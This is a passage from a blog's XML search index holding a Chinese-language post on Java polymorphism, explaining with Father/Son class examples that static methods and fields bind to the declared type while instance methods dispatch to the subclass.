      <link href="/2019/11/15/java-%E5%A4%9A%E6%80%81%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/11/15/java-%E5%A4%9A%E6%80%81%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><pre><code>Father father = new Son();</code></pre><blockquote><p>在这里想谈谈静态方法与静态变量和多态的关系。 </p><p>总得来说，成员函数不管静态还是非静态，以及成员变量在编译时都看左边父类名，具体运行则分为不同的情况。</p></blockquote><a id="more"></a><h2 id="静态方法和静态成员变量"><a href="#静态方法和静态成员变量" class="headerlink" title="静态方法和静态成员变量"></a>静态方法和静态成员变量</h2><p>父类中的静态方法，可以被继承但不能被重写，原因在于静态方法早在编译时就已经确定下来了，后面运行过程中不支持多态。</p><pre><code>class Father{    static void method()    {        System.out.println(&quot;father method&quot;);    }}class Son extends Father{    static void method()    {        System.out.println(&quot;son method&quot;);    }}</code></pre><pre><code>Father father = new Son();father.method();</code></pre><p>运行后的结果</p><pre><code>father method</code></pre><p>同理，当父类中使用静态变量时，子类中的同名变量也无法覆盖，变量的值在编译时就已经确定下来了。</p><pre><code>class Father{    static int num = 3;}class Son extends Father{    static int num = 4; //只要是同名变量，这里加不加static结果一样。}</code></pre><pre><code>Father father = new Son();        System.out.println(father.num);Son son = new Son();System.out.println(son.num);</code></pre><p>结果</p><pre><code>34</code></pre><h2 id="非静态成员函数"><a href="#非静态成员函数" class="headerlink" title="非静态成员函数"></a>非静态成员函数</h2><p>运行非静态成员函数时，是依据子类的方法来执行，动态成员函数支持多态，除非子类中没有这个方法，这个时候则会调用父类的方法。</p><p>这里不进行具体的代码展现。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
